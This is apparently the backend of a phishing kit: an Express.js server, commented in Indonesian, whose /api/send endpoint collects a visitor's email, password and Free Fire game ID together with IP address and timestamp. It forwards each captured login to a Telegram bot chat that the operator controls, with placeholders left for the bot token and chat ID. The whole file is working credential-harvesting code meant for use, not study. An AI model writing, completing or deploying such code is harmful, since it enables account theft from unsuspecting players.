const express = require('express');
const path = require('path');
const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN || 'ISI_TOKEN_BOT_KAMU';
const CHAT_ID = process.env.CHAT_ID || 'ISI_CHAT_ID_KAMU';

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post('/api/send', async (req, res) => {
  const { email, password, ffId } = req.body;

  if (!email || !password || !ffId) {
    return res.status(400).json({ ok: false, error: 'data incomplete' });
  }

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-';
  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  const text =
    '🎯 DATA BARU MASUK\n' +
    '━━━━━━━━━━━━━━━\n' +
    '📧 Email : ' + email + '\n' +
    '🔑 Password : ' + password + '\n' +
    '🎮 ID FF : ' + ffId + '\n' +
    '🕐 Waktu : ' + waktu + '\n' +
    '🌐 IP : ' + ip;

  try {
    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const tgData = await tgRes.json();
    if (!tgData.ok) {
      return res.status(500).json({ ok: false, error: 'telegram failed' });
    }
    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ ok: false, error: 'server error' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('running on ' + PORT));
